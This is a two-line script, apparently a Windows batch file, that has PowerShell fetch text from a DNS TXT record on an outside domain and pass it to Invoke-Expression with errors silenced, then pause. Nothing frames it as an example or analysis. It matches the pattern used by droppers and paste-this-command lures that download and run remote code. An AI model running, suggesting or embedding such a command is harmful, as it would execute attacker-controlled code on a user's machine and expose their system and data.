powershell iex '($c=(Resolve-DnsName 1.4s3c.net -Type TXT -EA SilentlyContinue).strings -join \"\")'
pause
